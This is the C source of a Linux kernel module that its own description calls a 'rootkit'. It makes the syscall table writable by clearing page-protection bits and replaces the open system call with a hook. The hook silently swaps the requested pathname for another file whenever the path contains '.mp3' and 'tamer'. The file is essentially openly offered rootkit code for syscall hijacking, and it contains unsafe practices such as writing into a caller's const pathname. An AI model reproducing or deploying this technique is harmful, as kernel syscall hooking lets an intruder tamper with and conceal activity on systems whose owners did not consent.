#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/errno.h> 
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>  
#include <asm/page.h>  
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <asm/string.h>

unsigned long *syscall_table;
char* my_path;
asmlinkage int (*original_open)(const char *pathname, int flags);

module_param(syscall_table, ulong, S_IRUGO);
module_param(my_path, charp, S_IRUGO);

int set_addr_rw(long unsigned int _addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

int set_addr_ro(long unsigned int _addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;
}

asmlinkage int new_open(const char *pathname, int flags) {

    // hijacked open
    int res;

    if(strstr(pathname, ".mp3") != NULL && strstr(pathname, "tamer") != NULL) {
    	printk(KERN_ALERT "OPEN HIJACKED %s\n", pathname);
	memcpy(pathname, my_path, strlen(my_path)+1);
    }
    
    return (*original_open)(pathname, flags);
}

static int init(void) {

    printk(KERN_ALERT "\nHIJACK INIT\n");

    set_addr_rw((unsigned long)syscall_table);

    original_open = (void *)syscall_table[__NR_open];
    syscall_table[__NR_open] = new_open;  

    //GPF_ENABLE;

    return 0;
}

static void exit(void) {

    syscall_table[__NR_open] = original_open;  
    set_addr_ro((unsigned long)syscall_table);

    //GPF_DISABLE;    

    printk(KERN_ALERT "MODULE EXIT\n");

    return;
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Se7so Gamed");
MODULE_DESCRIPTION("Just for fun.. rootkit");
module_init(init);
module_exit(exit);

